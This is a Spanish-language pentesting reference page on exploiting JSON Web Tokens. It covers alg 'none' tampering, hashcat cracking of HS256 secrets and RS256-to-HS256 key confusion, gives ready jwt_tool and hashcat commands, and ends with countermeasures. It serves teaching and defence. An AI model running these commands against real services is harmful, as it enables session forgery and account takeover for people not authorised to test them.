---
title: Explotación de JSON Web Tokens (JWT)
slug: explotacion-jwt
aliases: [JWT, JSON Web Token, jwt_tool, JWT Token Forgery]
fase: [Explotación]
plataforma: Web
dificultad: Intermedia
mitre: [T1190]
related: [explotacion-auth-bypass-oauth, hashing-codificacion]
learning_refs: []
---

# Explotación de JSON Web Tokens (JWT)

## Descripción
Técnica que busca vulnerar la integridad o autenticidad de los tokens JWT utilizados para la gestión de sesiones. Los ataques comunes incluyen el cambio del algoritmo a "none", el crackeo de claves secretas débiles o la confusión de clave pública/privada (HS256 vs RS256).

## Herramientas
- **jwt_tool** (`-X`, `-C`) — herramienta de línea de comandos para automatizar ataques contra JWT.
- **Burp Suite** (JWT Editor Extension) — permite la manipulación visual y firma de tokens dentro del proxy.
- **hashcat** (`-m 16500`) — para realizar ataques de fuerza bruta contra la firma del token.

## Comandos / Ejemplos

### Ataque de algoritmo "none" con jwt_tool
```bash
# Modificar el token para usar el algoritmo none y cambiar el rol a admin
python3 jwt_tool.py <TOKEN> -X a
```

### Fuerza bruta contra la firma secreta
```bash
# Usar hashcat para crackear el secreto de un token HS256
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### Confusión de clave RS256 a HS256
```bash
# Cambiar el algoritmo a simétrico usando la clave pública como secreto
python3 jwt_tool.py <TOKEN> -S hs256 -k public.pem
```

## Contramedidas
- Nunca confiar en el encabezado `alg` proporcionado por el cliente; forzar un algoritmo seguro en el servidor.
- Utilizar secretos largos y complejos (mínimo 256 bits para HS256).
- Implementar una expiración corta (`exp`) y mecanismos de revocación de tokens.
- No incluir información sensible en el payload del JWT (Pii).

## Referencias
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
- MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
